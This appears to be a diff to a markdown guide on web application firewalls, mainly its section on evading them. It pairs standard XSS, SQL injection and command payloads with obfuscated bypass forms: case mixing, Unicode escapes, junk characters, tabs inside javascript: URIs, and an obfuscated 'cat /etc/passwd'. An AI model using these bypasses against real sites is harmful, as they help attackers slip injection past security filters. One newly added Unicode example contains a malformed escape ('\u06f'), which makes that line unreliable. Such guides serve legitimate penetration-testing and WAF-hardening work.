@@ -5,7 +5,7 @@
 
 ![Main Logo](images/how-wafs-work.png 'How wafs work')
 
-__A Concise Definition:__ A web application firewall is a security policy enforcement point positioned between a web application and the client endpoint. This functionality can be implemented in software or hardware, running in an appliance device, or in a typical server running a common operating system. It may be a stand-alone device or integrated into other network components. *(Source [PCI DSS IS 6.6](https://www.pcisecuritystandards.org/documents/information_supplement_6.6.pdf))*
+__A Concise Definition:__ A web application firewall is a security policy enforcement point positioned between a web application and the client endpoint. This functionality can be implemented in software or hardware, running in an appliance device, or in a typical server running a common operating system. It may be a stand-alone device or integrated into other network components. *(Source: [PCI DSS IS 6.6](https://www.pcisecuritystandards.org/documents/information_supplement_6.6.pdf))*
 
 Feel free to [contribute](CONTRIBUTING.md).
 
@@ -1514,7 +1514,7 @@ Running a set of payloads against the URL/endpoint. Some nice fuzzing wordlists:
 
 ### Keyword Filter Detection/Bypass
 
-__Example__: SQL Injection
+__Case__: SQL Injection
 
 ##### • Step 1:
 __Keywords Filtered__: `and`, `or`, `union`  
@@ -1578,7 +1578,7 @@ __Standard__: `<script>alert()</script>`
 __Bypassed__: `<ScRipT>alert()</sCRipT>`
 
 __Standard__: `SELECT * FROM all_tables WHERE OWNER = 'DATABASE_NAME'`  
-__Bypassed__: `sELecT * FrOM all_tables whERe OwNeR = 'DATABASE_NAME'`
+__Bypassed__: `sELecT * FrOM all_tables whERe OWNER = 'DATABASE_NAME'`
 
 __2. URL Encoding__  
 - Encode normal payloads with % encoding/URL encoding.
@@ -1597,7 +1597,7 @@ __3. Unicode Encoding__
 - You can encode entire/part of the payload for obtaining results.
 
 __Standard__: `prompt()`  
-__Obfuscated__: `pro\u006dpt()`
+__Obfuscated__: `\u0070r\u06f\u006dpt()`
 
 __Standard__: `../../appusers.txt`  
 __Obfuscated__: `%C0AE%C0AE%C0AF%C0AE%C0AE%C0AFappusers.txt`
@@ -1667,10 +1667,14 @@ __Obfuscated__: `<iframe/onload='this["src"]="jav"+"as&Tab;cr"+"ipt:al"+"er"+"t(
 
 __9. Junk Chars__
 - Normal payloads get filtered out easily.
-- Adding some junk chars avoid detection (specific cases only).
+- Adding some junk chars helps avoid detection (specific cases only).
+- They often help in confusing regex based firewalls.
 
 __Standard__: `<script>alert()</script>`  
 __Obfuscated__: `<script>+-+-1-+-+alert(1)</script>`
+
+__Standard__: `<BODY onload=alert()>`  
+__Obfuscated__: ```<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert()>```
 
 __Standard__: `<a href=javascript;alert()>ClickMe `  
 __Bypassed__: `<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa  href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe`
@@ -1689,6 +1693,17 @@ __11. Uninitialized Variables__
 
 __Standard__: `cat /etc/passwd`  
 __Obfuscated__: `cat$u $u/etc$u/passwd$u`
+
+__12. Random Tabs__
+- Tabs often help to evade firewalls especially regex based ones.
+- Tabs can help break firewall regex when the regex is expecting whitespaces and not tabs.
+
+__Standard__: `<IMG SRC="javascript:alert();">`  
+__Bypassed__: `<IMG SRC="    javascript:alert();">`  
+__Variant__: `<IMG SRC="    jav    ascript:alert    ();">`
+
+__Standard__: `<iframe src=javascript:alert(1)></iframe>`  
+__Obfuscated__: `<iframe  src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>`
 
 ### Browser Bugs:
 #### Charset Bugs:
